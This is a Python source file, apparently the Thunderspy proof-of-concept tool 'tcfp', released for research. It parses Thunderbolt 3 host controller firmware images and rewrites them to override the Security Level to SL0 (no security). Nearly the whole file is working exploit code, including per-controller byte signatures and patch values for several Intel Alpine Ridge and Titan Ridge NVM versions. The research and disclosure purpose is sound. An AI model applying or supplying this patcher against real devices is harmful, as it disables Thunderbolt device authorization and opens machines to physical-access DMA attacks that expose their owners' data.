#!/usr/bin/env python
# -*- coding: UTF-8 -*-
#
# Thunderbolt 3 Host Controller Firmware Patcher (tcfp)
# Copyright (C) 2020 Björn Ruytenberg <bjorn@bjornweb.nl>
#
# This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more details. You should have
# received a copy of the GNU General Public License along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# This PoC exploits a Thunderbolt 3 vulnerability that enables unauthenticated overriding of Security Levels by patching host
# controller firmware. This tool has been released exclusively for research purposes and is not intended for unlawful actions.

import sys
import logging
import os
import argparse

VERSION = "Thunderbolt 3 Host Controller Firmware Patcher 1.0\n" \
          "(c) 2020 Björn Ruytenberg\n" \
          "https://thunderspy.io\n\n" \
          "Licensed under GNU GPLv3 or later <http://gnu.org/licenses/gpl.html>."

VALID_FILESIZE = 1048576
MAX_VALID_DROM_ENTRIES_LEN = 200
DROM_BASE = 0x4210
DROM_ENTRIES_BASE = DROM_BASE + 21  # 0x4225
SL_MAX_NUM = 4

pciIds = [
    # Source: https://pci-ids.ucw.cz/
    {0x1576: "DSL6340 Thunderbolt 3 Bridge [Alpine Ridge 4C 2015]"},
    {0x1578: "DSL6540 Thunderbolt 3 Bridge [Alpine Ridge 4C 2015]"},
    {0x15c0: "JHL6240 Thunderbolt 3 Bridge (Low Power) [Alpine Ridge LP 2016]"},
    {0x15da: "JHL6340 Thunderbolt 3 Bridge (C step) [Alpine Ridge 2C 2016]"},
    {0x15d3: "JHL6540 Thunderbolt 3 Bridge (C step) [Alpine Ridge 4C 2016]"},
    {0x15e7: "JHL7540 Thunderbolt 3 Bridge [Titan Ridge 2C 2018]"},
    {0x15ea: "JHL7540 Thunderbolt 3 Bridge [Titan Ridge 4C 2018]"},
    {0x15ef: "JHL7540 Thunderbolt 3 Bridge [Titan Ridge DD 2018]"}
]

slSigs = [
    # Listing all known patterns here, including tested NVM version.
    # NVM 33
    {'pci-id': 0x15da,
     'sl': 0,
     'sig':  [{'offset': 0x800, 'value': b'\x18'}],
     'patch': None
     },
    {'pci-id': 0x15da,
     'sl': 1,
     'sig':  [{'offset': 0x800, 'value': b'\x19'}],
     'patch': [{'offset': 0x800, 'value': b'\x18'}]
     },
    {'pci-id': 0x15da,
     'sl': 2,
     'sig':  [{'offset': 0x800, 'value': b'\x1A'}],
     'patch': [{'offset': 0x800, 'value': b'\x18'}]
     },
    {'pci-id': 0x15da,
     'sl': 3,
     'sig':  [{'offset': 0x0,   'value': b'\xFF'}, {'offset': 0x800, 'value': b'\xFF'}, {'offset': 0x1800, 'value': b'\x1B'}, {'offset': 0x1001, 'value': b'\x40'}],
     'patch': [{'offset': 0x0,   'value': b'\x00\x40\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00'}, {'offset': 0x800, 'value': b'\x18'}]
     },
    {'pci-id': 0x15da,
     'sl': 3,
     'sig':  [{'offset': 0x0,   'value': b'\xFF'}, {'offset': 0x800, 'value': b'\xFF'}, {'offset': 0x1800, 'value': b'\x1B'}, {'offset': 0x1001, 'value': b'\x20'}],
     'patch': [{'offset': 0x0,   'value': b'\x00\x20\x08\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00'}, {'offset': 0x800, 'value': b'\x18'}, {'offset': 0xFFC, 'value': b'\x10\x70\x03\x00'},
               {'offset': 0x1000, 'value': b'\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF'}, {'offset': 0x1800, 'value': b'\xFF'}, {'offset': 0x2008, 'value': b'\x37'}]
     },
    # NVM 41
    {'pci-id': 0x15d3,
     'sl': 0,
     'sig':  [{'offset': 0x0,   'value': b'\x00'}, {'offset': 0x800, 'value': b'\x18'}],
     'patch': None
     },
    {'pci-id': 0x15d3,
     'sl': 1,
     'sig':  [{'offset': 0x800, 'value': b'\xFF'}, {'offset': 0x1800, 'value': b'\x19'}],
     'patch': [{'offset': 0x0,   'value': b'\x00\x20\x08\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00'}, {'offset': 0x800, 'value': b'\x18'}, {'offset': 0x1800, 'value': b'\xFF'}]
     },
    {'pci-id': 0x15d3,
     'sl': 2,
     'sig':  [{'offset': 0x0,   'value': b'\xFF'}, {'offset': 0x800, 'value': b'\xFF'}, {'offset': 0x1800, 'value': b'\x1A'}],
     'patch': [{'offset': 0x0,   'value': b'\x00\x20\x08\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00'}, {'offset': 0x800, 'value': b'\x18'}, {'offset': 0x1800, 'value': b'\xFF'},
               {'offset': 0xA98, 'value': b'\x10\x00\x00\x04'}, {'offset': 0x1000, 'value': b'\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF'}]
     },
    {'pci-id': 0x15d3,
     'sl': 3,
     'sig':  [{'offset': 0x1000, 'value': b'\x00'}, {'offset': 0x1800, 'value': b'\x1B'}],
     'patch': [{'offset': 0x0,   'value': b'\x00\x20\x08\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00'}, {'offset': 0x800, 'value': b'\x18'}, {'offset': 0x1800, 'value': b'\xFF'},
               {'offset': 0xFFC, 'value': b'\x10\x70\x03\x00'}, {'offset': 0x1000,
                                                                 'value': b'\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF'},
               {'offset': 0xA98, 'value': b'\x10\x00\x00\x04'}, {'offset': 0x1A98, 'value': b'\xFF\xFF\xFF\xFF'}]
     },
    # NVM 28
    {'pci-id': 0x15d3,
     'sl': 1,
     'sig':  [{'offset': 0x0,   'value': b'\x00'}, {'offset': 0x800, 'value': b'\x19'}],
     'patch': []
     },
    # NVM 36
    {'pci-id': 0x15ea,
     'sl': 0,
     'sig':  [{'offset': 0x0,   'value': b'\x00'}, {'offset': 0x800, 'value': b'\x18'}],
     'patch': None
     },
    {'pci-id': 0x15ea,
     'sl': 1,
     'sig':  [{'offset': 0x0,   'value': b'\x00'}, {'offset': 0x800, 'value': b'\x19'}],
     'patch': [{'offset': 0x800, 'value': b'\x18'}]
     },
    {'pci-id': 0x15ea,
     'sl': 2,
     'sig':  [{'offset': 0x0,   'value': b'\xFF'}, {'offset': 0x800, 'value': b'\xFF'}, {'offset': 0x1800, 'value': b'\x1A'}],
     'patch': [{'offset': 0x0,   'value': b'\x00\x40\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00'}, {'offset': 0x800, 'value': b'\x18'}, {'offset': 0x1800, 'value': b'\xFF'}]
     },
    {'pci-id': 0x15ea,
     'sl': 3,
     'sig':  [{'offset': 0x0,   'value': b'\xFF'}, {'offset': 0x800, 'value': b'\xFF'}, {'offset': 0x1800, 'value': b'\x1B'}],
     'patch': [{'offset': 0x0,   'value': b'\x00\x40\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00'}, {'offset': 0x800, 'value': b'\x18'}]
     },
]

offsets = [
    # Generic
    {'pci-id': 0x4005, 'len': 2},
    # DROM
    {'entries-len': DROM_BASE+14, 'len': 2},
    {'vendor-id': DROM_BASE+16, 'len': 2},
    {'model-id': DROM_BASE+18, 'len': 2},
    {'nvm-rev': DROM_BASE+21, 'len': 1},
]


class Image:
    FileName = None
    ValidImage = False
    SupportedPciId = False
    PciId = 0
    PciDevName = "N/A"
    VendorStr = "N/A"
    DeviceStr = "N/A"
    VendorId = 0
    ModelId = 0
    NvmRev = 0
    SecurityLevel = -1
    MatchingSlSig = None

    def _getSigsByPciIdAndSl(self, pciId, sl):
        potentiallyMatchingSigs = []

        for sig in slSigs:
            # Match by PCI ID and SL
            if (sig["pci-id"] == pciId) and (sig["sl"] == sl):
                potentiallyMatchingSigs.append(sig)
            # pci-id == 0 => Ignore PCI ID, try matching against all patterns for given SL
            elif (sig["pci-id"] == 0) and (sig["sl"] == sl):
                potentiallyMatchingSigs.append(sig)
        return potentiallyMatchingSigs

    def _getDeviceNameByPciId(self, id):
        for device in pciIds:
            if id in device:
                return device[id]
        return "N/A"

    def _getOffsetByParm(self, parm):
        for offset in offsets:
            if parm in offset:
                return offset
        assert False, "Firmware parameter not supported: '" + parm + "'"

    def _parseImage(self, f, filename):
        # Size sanity check
        size = os.path.getsize(filename)
        if size < VALID_FILESIZE:
            raise Exception("File size smaller than " + str(VALID_FILESIZE) +
                            " bytes. Image probably corrupted. Aborting.")
        elif size > VALID_FILESIZE:
            logging.warning("File size exceeds " + str(VALID_FILESIZE) +
                            " bytes. Controller may be unsupported.")

        # PCI metadata
        pos = self._getOffsetByParm("pci-id")
        f.seek(pos["pci-id"])
        self.PciId = swap(f.read(pos["len"]), pos["len"])

        self.PciDevName = self._getDeviceNameByPciId(self.PciId)
        if self.PciDevName != "N/A":
            self.SupportedPciId = True
        else:
            logging.warning("Unrecognized PCI ID: '" +
                            str(hex(self.PciId)) + "'. Patching not supported.")

        # Find DROM entries
        pos = self._getOffsetByParm("entries-len")
        f.seek(pos["entries-len"])
        entriesLen = swap(f.read(pos["len"]), pos["len"])

        # DROM entries sanity check
        if entriesLen > MAX_VALID_DROM_ENTRIES_LEN:
            logging.warning("Image declares unlikely large DROM entries section (" + str(
                entriesLen) + "). Capping to " + str(MAX_VALID_DROM_ENTRIES_LEN) + ".")
            entriesLen = MAX_VALID_DROM_ENTRIES_LEN

        pos = self._getOffsetByParm("vendor-id")
        f.seek(pos["vendor-id"])
        self.VendorId = swap(f.read(pos["len"]), pos["len"])
        pos = self._getOffsetByParm("model-id")
        f.seek(pos["model-id"])
        self.ModelId = swap(f.read(pos["len"]), pos["len"])
        pos = self._getOffsetByParm("nvm-rev")
        f.seek(pos["nvm-rev"])
        self.NvmRev = swap(f.read(pos["len"]), pos["len"])

        # Find vendor and device string offsets
        # Move to DROM entries base
        pos = DROM_ENTRIES_BASE
        f.seek(pos)
        entryType = int.from_bytes(f.read(1), byteorder='big')
        entryLen = int.from_bytes(f.read(1), byteorder='big')
        entryIdx = int.from_bytes(f.read(1), byteorder='big')

        # Iterate over DROM entries until we encounter entry type generic and entry index 1
        validEntriesSection = True
        while not((entryType == 0xCB or entryType == 0xCC or entryType == 0)
                  and not(pos > DROM_ENTRIES_BASE + entriesLen) and entryIdx == 1):
            pos += entryLen
            f.seek(pos)
            entryType = int.from_bytes(f.read(1), byteorder='big')
            entryLen = int.from_bytes(f.read(1), byteorder='big')
            entryIdx = int.from_bytes(f.read(1), byteorder='big')

            if pos >= (DROM_ENTRIES_BASE + entriesLen):
                logging.warning(
                    "Image contains malformed DROM entries section. Ignoring.")
                validEntriesSection = False
                break

        if validEntriesSection == True:
            # Vendor string
            # Skip header bytes (entry type, entry length, entry index)
            pos += 3
            f.seek(pos)
            self.VendorStr = f.read(entryLen-3)
            # Device string
            pos += (entryLen-2)
            f.seek(pos)
            entryLen = int.from_bytes(f.read(1), byteorder='big')
            pos += 2
            f.seek(pos)
            self.DeviceStr = f.read(entryLen-3)
        else:
            self.VendorStr = "N/A"
            self.DeviceStr = "N/A"

        self.ValidImage = True

    def _parseSecurityLevel(self, f):
        if self.SupportedPciId == False:
            logging.warning("Cannot parse SL: PCI ID unsupported.")
            return -1

        try:
            # Try all SL patterns for our PCI ID
            potentiallyMatchingSigs = []
            for i in range(SL_MAX_NUM):
                potentiallyMatchingSigs = self._getSigsByPciIdAndSl(
                    self.PciId, i)

                for sig in potentiallyMatchingSigs:
                    # All patterns for current signature must match
                    allPatternsMatch = True

                    for pattern in sig["sig"]:
                        f.seek(pattern["offset"])
                        data = f.read(1)
                        if data != pattern["value"]:
                            allPatternsMatch = False
                            break

                    if allPatternsMatch == True:
                        self.MatchingSlSig = sig
                        return i

            if len(potentiallyMatchingSigs) == 0:
                logging.warning("PCI ID '" + str(hex(self.PciId)) +
                                "' has no known signatures. Ignoring PCI ID and trying all patterns instead.")
            else:
                logging.warning("No matching SL patterns for PCI ID '" + str(
                    hex(self.PciId)) + "'. Ignoring PCI ID and trying all patterns instead.")

            # We did not recognize the PCI ID, or we do, but failed to match SL against its known signatures.
            # Try matching against signatures for other devices.
            for i in range(SL_MAX_NUM):
                # pci-id == 0 -> ignore PCI ID
                potentiallyMatchingSigs = self._getSigsByPciIdAndSl(
                    self.PciId, 0)

                for sig in potentiallyMatchingSigs:
                    # All patterns for current signature must match
                    allPatternsMatch = True

                    for pattern in sig["sig"]:
                        f.seek(pattern["offset"])
                        data = f.read(1)
                        if data != pattern["value"]:
                            allPatternsMatch = False
                            break

                    if allPatternsMatch == True:
                        self.MatchingSlSig = sig
                        self.SupportedPciId = False
                        return i

            logging.warning("No matching SL patterns found.")
            return -1
        except Exception as e:
            print("Cannot parse Security Level: ", e)
            return -1

    def __init__(self, filename):
        self.FileName = filename

        try:
            f = open(self.FileName, 'rb')
            self._parseImage(f, self.FileName)

            if self.ValidImage == True:
                self.SecurityLevel = self._parseSecurityLevel(f)
                if self.SecurityLevel == -1:
                    securityLevelStr = "N/A"
                else:
                    securityLevelStr = "SL" + str(self.SecurityLevel)

                self.imageParms = {
                    "Vendor ID": hex(self.VendorId),
                    "PCI ID": hex(self.PciId),
                    "PCI Device Name": self.PciDevName,
                    "Model ID": hex(self.ModelId),
                    "NVM version": str(self.NvmRev) + " (" + hex(self.NvmRev) + ")",
                    "Vendor": self.VendorStr.decode("utf-8"),
                    "Device": self.DeviceStr.decode("utf-8"),
                    "Security Level": securityLevelStr
                }

            f.close()
        except IOError as e:
            raise Exception("Cannot read file: ", e)
        except Exception as e:
            raise Exception("Cannot parse image: ", e)


class Patcher:
    @staticmethod
    def PatchImage(image, targetSl):
        assert targetSl == 0, "Only SL0 is currently supported."
        assert image.ValidImage == True, "Not a valid firmware image, and this should have been caught in image.ParseImage."

        if image.SecurityLevel == -1 and image.SupportedPciId == False:
            raise Exception(
                "PCI ID unsupported and unable to parse current SL. Aborting.")
        if image.SecurityLevel == -1 and image.SupportedPciId == True:
            raise Exception(
                "PCI ID supported, but unable to parse current SL (different NVM version?). Aborting.")
        if image.SecurityLevel != -1 and image.SupportedPciId == False:
            if len(image.MatchingSlSig["patch"]) > 0:
                logging.warning(
                    "PCI ID unsupported, but current SL detected through heuristics. Patching may fail.")
            else:
                raise Exception(
                    "PCI ID unsupported, but current SL detected through heuristics. No patch pattern available for this SL signature. Aborting.")
        if image.SecurityLevel == 0:
            raise Exception("Current SL is already 0. No need to patch.")
        if image.SecurityLevel != -1 and image.SupportedPciId == True and len(image.MatchingSlSig["patch"]) == 0:
            raise Exception(
                "PCI ID supported, but no patch pattern available for this SL signature. Aborting.")

        try:
            f = open(image.FileName, 'r+b')
            for pattern in image.MatchingSlSig["patch"]:
                f.seek(pattern["offset"])
                f.write(pattern['value'])
            f.close()
        except Exception as e:
            raise Exception("Cannot patch image: ", e)


def swap(x, len):
    return int.from_bytes(x, byteorder='little', signed=False)


def get_args_parser():
    # create the top-level parser
    parser = argparse.ArgumentParser(
        description="Thunderbolt 3 Host Controller Firmware Patcher",
        epilog="(c) 2020 Björn Ruytenberg <bjorn@bjornweb.nl>. Licensed under GPLv3."
    )
    parser.add_argument("-v", "--version", action="store_true", default=False,
                        help="Show program's version number and exit.")
    subparsers = parser.add_subparsers(dest="command")

    # create the parser for the "parse" command
    parser_parse = subparsers.add_parser("parse",
                                         help="Parse firmware image metadata and Security Level.")
    parser_parse.add_argument("file", type=str,
                              help="Path to the firmware image.")

    # create the parser for the "patch" command
    parser_patch = subparsers.add_parser("patch",
                                         help="Patch firmware image to override Security Level to SL0 (no security).")
    parser_patch.add_argument("file", type=str,
                              help="Patch firmware image to override Security Level to SL0 (no security).")

    return parser


def main():
    parser = get_args_parser()
    args = parser.parse_args()

    if len(sys.argv) == 1:
        parser.print_help()

    elif args.version:
        print(VERSION)

    elif args.command == "parse" or args.command == "patch":
        try:
            image = Image(str(sys.argv[2]))
            for parm in image.imageParms:
                print(parm, ":", image.imageParms[parm])
            print("")

            if args.command == "patch":
                Patcher.PatchImage(image, 0)
                print("Image patched succesfully.")

        except Exception as e:
            print("Error while processing firmware image: ", e)


if __name__ == '__main__':
    if sys.version_info <= (3, 0):
        print("This script requires Python 3.x. Aborting.")
    else:
        logging.basicConfig(level=logging.DEBUG,
                            format=' %(asctime)s - %(levelname)s - %(message)s')
        main()
